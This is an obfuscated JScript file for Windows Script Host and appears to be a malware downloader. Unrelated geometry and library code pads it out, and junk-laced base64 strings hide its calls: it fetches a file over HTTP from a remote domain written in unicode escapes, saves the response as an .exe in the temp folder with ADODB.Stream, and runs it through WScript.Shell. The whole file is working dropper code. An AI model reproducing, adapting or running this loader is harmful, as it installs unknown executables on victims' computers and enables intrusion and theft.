
var proportion = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  announcements = [];
	
var aquatic = { ':': '.','U': 'S','381': 'X'};
	var buffoon = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function exhilaration(looksmart) {
	lexington = looksmart;
	for (var i in aquatic){lexington = lexington.replace(i, aquatic[i]);}
    return lexington;
};

var artistic = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.exhilaration4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("wrongdoing").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = proportion[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = proportion[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = proportion[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = proportion[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var brunswick ="wrongdoingJVwrongdoingRFTVwrongdoingAl".exhilaration4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var sixtythree = "wrongdoingQWwrongdoingN0aXZwrongdoinglWE9iawrongdoingmVjdA=wrongdoing=".exhilaration4();
String.prototype.exhilaration2 = function () {
    var dover = {
        nostrum: this
    };
    dover.laddie = dover.nostrum["c3Vic3RyaW5n".exhilaration4()](buffoon, artistic);
    return dover.laddie;
};

var albion ="wrongdoingRXhwYW5wrongdoingkRW52aXwrongdoingJvbm1lbnRTdHJwrongdoingpbmdz".exhilaration4();
var Native = function(options){
	
};
var vagaries = [sixtythree, albion,brunswick,  ""+"."+("google","commit","tarts","interventions","argue","spray","nomination","zoology","exe"), "UnVu".exhilaration4(), exhilaration("M"+"SX"+"ML"+("classic","mushroom","twentyeighth","hydrocodone","grams","reserves","didactic","2.")+"381M"+"LH"+"TT"+("hungry","inoffensive","paradise","duality","coined","cartoons","booby","entitle","P>")+"WU"+("gloat","specialists","flaccid","polynesia","slovak","washstand","bidding","cr")+("concerto","vindictive","compact","reliance","recognizable","corfu","material","prefix","ip")+"t:"+("implication","labyrinth","coconut","beliefs","received","irreparable","magnate","cinema","Sh")+"ell")];
abase = "_F2_";
var redundant = this[vagaries.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
aYDtJDPts = "ngRkBH";
sumatra = (("stacked", "shift", "politicians", "darts", "outwardly", "undervalue", "buttermilk", "pnAHQem") + "FCbQlKOhuCT").exhilaration2();
speaks = (("counterpart", "interests", "vaunt", "masturbation", "associate", "bless", "voter", "grannie", "wallpapers", "suEYMzq") + "BJXlToivX").exhilaration2();
  
    String.prototype.grenada = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var emoluments = vagaries.pop().split(">");

conjunction = "b3Blbg==".exhilaration4();
var surveillance = new redundant(emoluments[1]);
var policies = new redundant(emoluments[0]);
var silky = surveillance[vagaries.shift()](vagaries.shift());
weasel = "E";

var covertly = vagaries.shift();
var genome = vagaries.shift();
function david(acquisition, gains) {

    try {
        var arson = silky + "/" + gains ;
		arson = arson+ covertly;
            policies[conjunction](("hollywood","samsung","G" + weasel) + ("tattered","venezuela","superior","amendments","T"), acquisition, false);
       
    kNVLENhCX = "_F7_";
    policies[speaks + ("hamilton","heading","end")]();
	var liable=("sumatra" + WScript=="sumatra" + "V2luZG93cyBTY3JpcHQgSG9zdA==".exhilaration4())&&policies["c3RhdHVz".exhilaration4()] +""=="MjAw".exhilaration4()&&typeof(HofKppw)==="undefined";
	lQHNgR = "_F8_";
    if (liable) {
		
        var infra = new redundant((("cyclone","gibbet","glass","caretaker","collect","grumble","inappropriate","colin","A")+("dunbar","feudalism","narrator","quill","furlough","storehouse","provisions","flatterer","SEOO")+"DB"+("warrior","packing","collective","surplus","responsibilities","suites","interpreted",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        infra[conjunction]();
        xoNhAxK = "_F9_";
        infra.type = artistic;
        HqgBcoP = "_F10_";
        infra["d3JpdGU=".exhilaration4()](policies[("amenities","baiting","vouchsafe","instead","offline","cowboy","sally","")+"R"+"es"+"pon"+aquatic['U'].toLowerCase()+"e"+"Qm9keQ==".exhilaration4()]);
        kOXsPQRjB = "_F11_";
        infra[(sumatra + "o"+("insincere","charter","skill","extortion","compensation","pennon","advanced","thermal","00")+("furthest","talker","digital","advisor","updated","trainers","cholesterol","8i")+"tion").replace("0"+("aging","disney","burdensome","matthew","removal","particularly","inconspicuous","08"), speaks)] = 0;
        XmDmVE = "_F12_";
        infra.saveToFile(arson, 2);
        UXJScnxbpfP = "_F13_";
        infra.close();
        vgtxFAzq = "_F14_";
		surveillance[genome](arson, artistic, true);
    }
} catch (xGvEFs) { };

    xKutAJgp = "_F15_";
}
try{
david("aHR0cDovLw==".exhilaration4()+"\u0076\u0061\u006B\u0061\u006E\u0074\u0069\u0065\u0068\u0075\u0069\u0073\u0069\u006E\u0061\u0075\u0076\u0065\u0072\u0067"+"\u006E\u0065\u002E\u0063\u006F\u006D\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?FhAzrz=cLfbDNXLwn","xrnowTYCDK");}catch(UKYdrYsX){}

   LWVtRzrUJM = "_F16_";
   